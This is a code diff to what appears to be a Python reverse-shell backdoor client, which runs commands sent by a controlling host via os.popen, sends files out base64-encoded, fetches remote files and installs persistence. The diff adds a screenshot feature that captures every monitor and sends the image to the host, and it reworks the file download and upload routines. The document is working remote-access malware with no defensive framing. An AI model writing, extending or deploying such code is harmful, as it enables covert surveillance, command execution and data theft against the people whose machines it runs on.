@@ -7,6 +7,8 @@ import os
 import shutil
 import sys
 import requests
+from mss import mss
+
 
 def client():
     global s
@@ -32,23 +34,29 @@ def shell():
         elif cmd.startswith("cd") and len(cmd) > 1:
             try:
                 os.chdir(cmd[3:])
-            except:
+            except Exception as e:
+                if debug:
+                    print(e)
                 continue
         elif cmd.startswith("download"):
-            download(cmd)
+            download(cmd[9:])
         elif cmd.startswith("upload"):
-            upload(cmd)
+            upload(cmd[7:])
         elif cmd.startswith("get"):
             download_remote(cmd)
         elif cmd.startswith("persistence"):
             persistence()
+        elif cmd.startswith("screenshot"):
+            screenshot()
         else:
             try:
                 proc = os.popen(cmd)  # open a process to run commands on shell
                 res = proc.read()  # command result
                 reliable_send(res)
-            except:
+            except Exception as e:
                 reliable_send("Unrecognized command")
+                if debug:
+                    print(e)
 
 
 def reliable_send(data):
@@ -62,8 +70,27 @@ def reliable_recv():
         try:
             json_data = json_data + s.recv(1024)
             return json.loads(json_data.decode())
-        except ValueError:
+        except ValueError as e:
+            if debug:
+                print(e)
             continue
+
+
+def screenshot():
+    """
+    Perform a screenshot and send to the host
+    """
+    try:
+        filename = "capture.png"
+        with mss() as screen:
+            screen.shot(mon=-1, output=filename)
+        with open(filename, "rb") as file:
+            reliable_send(base64.b64encode(file.read()))
+        os.remove(filename)
+    except Exception as e:
+        reliable_send("Error taking the screenshot")
+        if debug:
+            print(e)
 
 
 def download_remote(cmd):
@@ -78,37 +105,45 @@ def download_remote(cmd):
         with open(file_name, "wb") as out_file:
             out_file.write(response.content)
             reliable_send("Download completed")
-    except:
+    except Exception as e:
         reliable_send("Download failed")
+        if debug:
+            print(e)
 
 
-def download(cmd):
+def download(filename):
     """
     Send the file to the host
-    :param cmd:
+    :param filename:
     :return:
     """
     try:
-        with open(cmd[9:], "rb") as file:
-            reliable_send(base64.b64encode(file.read()))
-            return True
-    except:
-        return False
+        with open(filename, "rb") as file:
+            b64 = base64.b64encode(file.read())
+            string = b64.decode()
+            reliable_send(string)
+    except Exception as e:
+        if debug:
+            print(e)
 
 
-def upload(cmd):
+def upload(filename):
     """
     Receive a file from the host
-    :param cmd:
+    :param filename:
     :return:
     """
     try:
-        with open(cmd[7:], "wb") as file:
+        with open(filename, "wb") as file:
             result = reliable_recv()
-            file.write(base64.b64decode(result))
+            # convert result from string to bytes, then decode b64
+            file.write(base64.b64decode(result.encode()))
+            reliable_send("Upload completed")
             return True
-    except:
-        return False
+    except Exception as e:
+        reliable_send("Operation failed")
+        if debug:
+            print(e)
 
 
 #
@@ -130,5 +165,7 @@ def persistence():
 
 
 if __name__ == '__main__':
+    global debug
+    debug = True
     client()
     shell()
